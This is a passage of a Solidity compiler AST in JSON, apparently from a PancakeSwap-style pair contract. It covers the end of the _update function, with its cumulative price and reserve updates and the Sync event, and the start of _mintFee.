																								"argumentTypes": null,
																								"id": 712,
																								"name": "UQ112x112",
																								"nodeType": "Identifier",
																								"overloadedDeclarations": [],
																								"referencedDeclaration": 2428,
																								"src": "3544:9:1",
																								"typeDescriptions": {
																									"typeIdentifier": "t_type$_t_contract$_UQ112x112_$2428_$",
																									"typeString": "type(library UQ112x112)"
																								}
																							},
																							"id": 713,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": false,
																							"lValueRequested": false,
																							"memberName": "encode",
																							"nodeType": "MemberAccess",
																							"referencedDeclaration": 2409,
																							"src": "3544:16:1",
																							"typeDescriptions": {
																								"typeIdentifier": "t_function_internal_pure$_t_uint112_$returns$_t_uint224_$",
																								"typeString": "function (uint112) pure returns (uint224)"
																							}
																						},
																						"id": 715,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"kind": "functionCall",
																						"lValueRequested": false,
																						"names": [],
																						"nodeType": "FunctionCall",
																						"src": "3544:27:1",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint224",
																							"typeString": "uint224"
																						}
																					},
																					"id": 716,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"memberName": "uqdiv",
																					"nodeType": "MemberAccess",
																					"referencedDeclaration": 2427,
																					"src": "3544:33:1",
																					"typeDescriptions": {
																						"typeIdentifier": "t_function_internal_pure$_t_uint224_$_t_uint112_$returns$_t_uint224_$bound_to$_t_uint224_$",
																						"typeString": "function (uint224,uint112) pure returns (uint224)"
																					}
																				},
																				"id": 718,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"kind": "functionCall",
																				"lValueRequested": false,
																				"names": [],
																				"nodeType": "FunctionCall",
																				"src": "3544:44:1",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint224",
																					"typeString": "uint224"
																				}
																			}
																		],
																		"expression": {
																			"argumentTypes": [
																				{
																					"typeIdentifier": "t_uint224",
																					"typeString": "uint224"
																				}
																			],
																			"id": 711,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"lValueRequested": false,
																			"nodeType": "ElementaryTypeNameExpression",
																			"src": "3539:4:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_type$_t_uint256_$",
																				"typeString": "type(uint256)"
																			},
																			"typeName": "uint"
																		},
																		"id": 719,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"kind": "typeConversion",
																		"lValueRequested": false,
																		"names": [],
																		"nodeType": "FunctionCall",
																		"src": "3539:50:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "*",
																	"rightExpression": {
																		"argumentTypes": null,
																		"id": 720,
																		"name": "timeElapsed",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 694,
																		"src": "3608:11:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint32",
																			"typeString": "uint32"
																		}
																	},
																	"src": "3539:80:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "3499:120:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 723,
															"nodeType": "ExpressionStatement",
															"src": "3499:120:1"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 736,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 724,
																	"name": "price1CumulativeLast",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 489,
																	"src": "3633:20:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "+=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 735,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"arguments": [
																			{
																				"argumentTypes": null,
																				"arguments": [
																					{
																						"argumentTypes": null,
																						"id": 731,
																						"name": "_reserve1",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 662,
																						"src": "3712:9:1",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint112",
																							"typeString": "uint112"
																						}
																					}
																				],
																				"expression": {
																					"argumentTypes": [
																						{
																							"typeIdentifier": "t_uint112",
																							"typeString": "uint112"
																						}
																					],
																					"expression": {
																						"argumentTypes": null,
																						"arguments": [
																							{
																								"argumentTypes": null,
																								"id": 728,
																								"name": "_reserve0",
																								"nodeType": "Identifier",
																								"overloadedDeclarations": [],
																								"referencedDeclaration": 660,
																								"src": "3695:9:1",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint112",
																									"typeString": "uint112"
																								}
																							}
																						],
																						"expression": {
																							"argumentTypes": [
																								{
																									"typeIdentifier": "t_uint112",
																									"typeString": "uint112"
																								}
																							],
																							"expression": {
																								"argumentTypes": null,
																								"id": 726,
																								"name": "UQ112x112",
																								"nodeType": "Identifier",
																								"overloadedDeclarations": [],
																								"referencedDeclaration": 2428,
																								"src": "3678:9:1",
																								"typeDescriptions": {
																									"typeIdentifier": "t_type$_t_contract$_UQ112x112_$2428_$",
																									"typeString": "type(library UQ112x112)"
																								}
																							},
																							"id": 727,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": false,
																							"lValueRequested": false,
																							"memberName": "encode",
																							"nodeType": "MemberAccess",
																							"referencedDeclaration": 2409,
																							"src": "3678:16:1",
																							"typeDescriptions": {
																								"typeIdentifier": "t_function_internal_pure$_t_uint112_$returns$_t_uint224_$",
																								"typeString": "function (uint112) pure returns (uint224)"
																							}
																						},
																						"id": 729,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"kind": "functionCall",
																						"lValueRequested": false,
																						"names": [],
																						"nodeType": "FunctionCall",
																						"src": "3678:27:1",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint224",
																							"typeString": "uint224"
																						}
																					},
																					"id": 730,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"memberName": "uqdiv",
																					"nodeType": "MemberAccess",
																					"referencedDeclaration": 2427,
																					"src": "3678:33:1",
																					"typeDescriptions": {
																						"typeIdentifier": "t_function_internal_pure$_t_uint224_$_t_uint112_$returns$_t_uint224_$bound_to$_t_uint224_$",
																						"typeString": "function (uint224,uint112) pure returns (uint224)"
																					}
																				},
																				"id": 732,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"kind": "functionCall",
																				"lValueRequested": false,
																				"names": [],
																				"nodeType": "FunctionCall",
																				"src": "3678:44:1",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint224",
																					"typeString": "uint224"
																				}
																			}
																		],
																		"expression": {
																			"argumentTypes": [
																				{
																					"typeIdentifier": "t_uint224",
																					"typeString": "uint224"
																				}
																			],
																			"id": 725,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"lValueRequested": false,
																			"nodeType": "ElementaryTypeNameExpression",
																			"src": "3673:4:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_type$_t_uint256_$",
																				"typeString": "type(uint256)"
																			},
																			"typeName": "uint"
																		},
																		"id": 733,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"kind": "typeConversion",
																		"lValueRequested": false,
																		"names": [],
																		"nodeType": "FunctionCall",
																		"src": "3673:50:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "*",
																	"rightExpression": {
																		"argumentTypes": null,
																		"id": 734,
																		"name": "timeElapsed",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 694,
																		"src": "3742:11:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint32",
																			"typeString": "uint32"
																		}
																	},
																	"src": "3673:80:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "3633:120:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 737,
															"nodeType": "ExpressionStatement",
															"src": "3633:120:1"
														}
													]
												}
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 744,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 740,
														"name": "reserve0",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 481,
														"src": "3773:8:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint112",
															"typeString": "uint112"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"id": 742,
																"name": "balance0",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 656,
																"src": "3792:8:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															],
															"id": 741,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"lValueRequested": false,
															"nodeType": "ElementaryTypeNameExpression",
															"src": "3784:7:1",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_uint112_$",
																"typeString": "type(uint112)"
															},
															"typeName": "uint112"
														},
														"id": 743,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "typeConversion",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "3784:17:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint112",
															"typeString": "uint112"
														}
													},
													"src": "3773:28:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint112",
														"typeString": "uint112"
													}
												},
												"id": 745,
												"nodeType": "ExpressionStatement",
												"src": "3773:28:1"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 750,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 746,
														"name": "reserve1",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 483,
														"src": "3811:8:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint112",
															"typeString": "uint112"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"id": 748,
																"name": "balance1",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 658,
																"src": "3830:8:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															],
															"id": 747,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"lValueRequested": false,
															"nodeType": "ElementaryTypeNameExpression",
															"src": "3822:7:1",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_uint112_$",
																"typeString": "type(uint112)"
															},
															"typeName": "uint112"
														},
														"id": 749,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "typeConversion",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "3822:17:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint112",
															"typeString": "uint112"
														}
													},
													"src": "3811:28:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint112",
														"typeString": "uint112"
													}
												},
												"id": 751,
												"nodeType": "ExpressionStatement",
												"src": "3811:28:1"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 754,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 752,
														"name": "blockTimestampLast",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 485,
														"src": "3849:18:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint32",
															"typeString": "uint32"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 753,
														"name": "blockTimestamp",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 683,
														"src": "3870:14:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint32",
															"typeString": "uint32"
														}
													},
													"src": "3849:35:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint32",
														"typeString": "uint32"
													}
												},
												"id": 755,
												"nodeType": "ExpressionStatement",
												"src": "3849:35:1"
											},
											{
												"eventCall": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 757,
															"name": "reserve0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 481,
															"src": "3904:8:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														},
														{
															"argumentTypes": null,
															"id": 758,
															"name": "reserve1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 483,
															"src": "3914:8:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															},
															{
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														],
														"id": 756,
														"name": "Sync",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															615
														],
														"referencedDeclaration": 615,
														"src": "3899:4:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_event_nonpayable$_t_uint112_$_t_uint112_$returns$__$",
															"typeString": "function (uint112,uint112)"
														}
													},
													"id": 759,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "3899:24:1",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 760,
												"nodeType": "EmitStatement",
												"src": "3894:29:1"
											}
										]
									},
									"documentation": null,
									"id": 762,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "_update",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 663,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 656,
												"name": "balance0",
												"nodeType": "VariableDeclaration",
												"scope": 762,
												"src": "2973:13:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 655,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "2973:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 658,
												"name": "balance1",
												"nodeType": "VariableDeclaration",
												"scope": 762,
												"src": "2996:13:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 657,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "2996:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 660,
												"name": "_reserve0",
												"nodeType": "VariableDeclaration",
												"scope": 762,
												"src": "3019:17:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint112",
													"typeString": "uint112"
												},
												"typeName": {
													"id": 659,
													"name": "uint112",
													"nodeType": "ElementaryTypeName",
													"src": "3019:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint112",
														"typeString": "uint112"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 662,
												"name": "_reserve1",
												"nodeType": "VariableDeclaration",
												"scope": 762,
												"src": "3046:17:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint112",
													"typeString": "uint112"
												},
												"typeName": {
													"id": 661,
													"name": "uint112",
													"nodeType": "ElementaryTypeName",
													"src": "3046:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint112",
														"typeString": "uint112"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2963:106:1"
									},
									"returnParameters": {
										"id": 664,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "3078:0:1"
									},
									"scope": 1700,
									"src": "2947:983:1",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "private"
								},
								{
									"body": {
										"id": 873,
										"nodeType": "Block",
										"src": "4123:793:1",
										"statements": [
											{
												"assignments": [
													772
												],
												"declarations": [
													{
														"constant": false,
														"id": 772,
														"name": "feeTo",
														"nodeType": "VariableDeclaration",
														"scope": 873,
														"src": "4133:13:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														},
														"typeName": {
															"id": 771,
															"name": "address",
															"nodeType": "ElementaryTypeName",
															"src": "4133:7:1",
															"stateMutability": "nonpayable",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 778,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"expression": {
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 774,
																	"name": "factory",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 473,
																	"src": "4165:7:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 773,
																"name": "IPancakeFactory",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1984,
																"src": "4149:15:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_contract$_IPancakeFactory_$1984_$",
																	"typeString": "type(contract IPancakeFactory)"
																}
															},
															"id": 775,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "4149:24:1",
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_IPancakeFactory_$1984",
																"typeString": "contract IPancakeFactory"
															}
														},
														"id": 776,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "feeTo",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 1933,
														"src": "4149:30:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_view$__$returns$_t_address_$",
															"typeString": "function () view external returns (address)"
														}
													},
													"id": 777,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "4149:32:1",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "4133:48:1"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 785,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 779,
														"name": "feeOn",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 769,
														"src": "4191:5:1",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														},
														"id": 784,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"id": 780,
															"name": "feeTo",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 772,
															"src": "4199:5:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "!=",
														"rightExpression": {
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"hexValue": "30",
																	"id": 782,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "4216:1:1",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	},
																	"value": "0"
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	}
																],
																"id": 781,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "4208:7:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": "address"
															},
															"id": 783,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "4208:10:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														"src": "4199:19:1",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"src": "4191:27:1",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 786,
												"nodeType": "ExpressionStatement",
												"src": "4191:27:1"
											},
											{
												"assignments": [
													788
												],
												"declarations": [
													{
														"constant": false,
														"id": 788,
														"name": "_kLast",
														"nodeType": "VariableDeclaration",
														"scope": 873,
														"src": "4228:11:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 787,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "4228:4:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 790,
												"initialValue": {
													"argumentTypes": null,
													"id": 789,
													"name": "kLast",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 491,
													"src": "4242:5:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "4228:19:1"
											},
											{
												"condition": {
													"argumentTypes": null,
													"id": 791,
													"name": "feeOn",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 769,
													"src": "4276:5:1",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": {
													"condition": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 865,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"id": 863,
															"name": "_kLast",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 788,
															"src": "4863:6:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "!=",
														"rightExpression": {
															"argumentTypes": null,
															"hexValue": "30",
															"id": 864,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "4873:1:1",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_0_by_1",
																"typeString": "int_const 0"
															},
															"value": "0"
														},
														"src": "4863:11:1",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"falseBody": null,
													"id": 871,
													"nodeType": "IfStatement",
													"src": "4859:51:1",
													"trueBody": {
														"id": 870,
														"nodeType": "Block",
														"src": "4876:34:1",
														"statements": [
															{
																"expression": {
																	"argumentTypes": null,
																	"id": 868,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftHandSide": {
																		"argumentTypes": null,
																		"id": 866,
																		"name": "kLast",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 491,
																		"src": "4890:5:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "Assignment",
																	"operator": "=",
																	"rightHandSide": {
																		"argumentTypes": null,
																		"hexValue": "30",
																		"id": 867,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "4898:1:1",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_0_by_1",
																			"typeString": "int_const 0"
																		},
																		"value": "0"
																	},
																	"src": "4890:9:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"id": 869,
																"nodeType": "ExpressionStatement",
																"src": "4890:9:1"
															}
														]
													}
												},
												"id": 872,
												"nodeType": "IfStatement",
												"src": "4272:638:1",
												"trueBody": {
													"id": 862,
													"nodeType": "Block",
													"src": "4283:570:1",
													"statements": [
														{
															"condition": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 794,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 792,
																	"name": "_kLast",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 788,
																	"src": "4301:6:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "!=",
																"rightExpression": {
																	"argumentTypes": null,
																	"hexValue": "30",
																	"id": 793,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "4311:1:1",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	},
																	"value": "0"
																},
																"src": "4301:11:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"falseBody": null,
															"id": 861,
															"nodeType": "IfStatement",
															"src": "4297:546:1",
															"trueBody": {
																"id": 860,
																"nodeType": "Block",
																"src": "4314:529:1",
																"statements": [
																	{
																		"assignments": [
																			796
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 796,
																				"name": "rootK",
																				"nodeType": "VariableDeclaration",
																				"scope": 860,
																				"src": "4332:10:1",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"typeName": {
																					"id": 795,
																					"name": "uint",
																					"nodeType": "ElementaryTypeName",
																					"src": "4332:4:1",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 806,
																		"initialValue": {
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"arguments": [
																						{
																							"argumentTypes": null,
																							"id": 803,
																							"name": "_reserve1",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 766,
																							"src": "4375:9:1",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint112",
																								"typeString": "uint112"
																							}
																						}
																					],
																					"expression": {
																						"argumentTypes": [
																							{
																								"typeIdentifier": "t_uint112",
																								"typeString": "uint112"
																							}
																						],
																						"expression": {
																							"argumentTypes": null,
																							"arguments": [
																								{
																									"argumentTypes": null,
																									"id": 800,
																									"name": "_reserve0",
																									"nodeType": "Identifier",
																									"overloadedDeclarations": [],
																									"referencedDeclaration": 764,
																									"src": "4360:9:1",
																									"typeDescriptions": {
																										"typeIdentifier": "t_uint112",
																										"typeString": "uint112"
																									}
																								}
																							],
																							"expression": {
																								"argumentTypes": [
																									{
																										"typeIdentifier": "t_uint112",
																										"typeString": "uint112"
																									}
																								],
																								"id": 799,
																								"isConstant": false,
																								"isLValue": false,
																								"isPure": true,
																								"lValueRequested": false,
																								"nodeType": "ElementaryTypeNameExpression",
																								"src": "4355:4:1",
																								"typeDescriptions": {
																									"typeIdentifier": "t_type$_t_uint256_$",
																									"typeString": "type(uint256)"
																								},
																								"typeName": "uint"
																							},
																							"id": 801,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": false,
																							"kind": "typeConversion",
																							"lValueRequested": false,
																							"names": [],
																							"nodeType": "FunctionCall",
																							"src": "4355:15:1",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
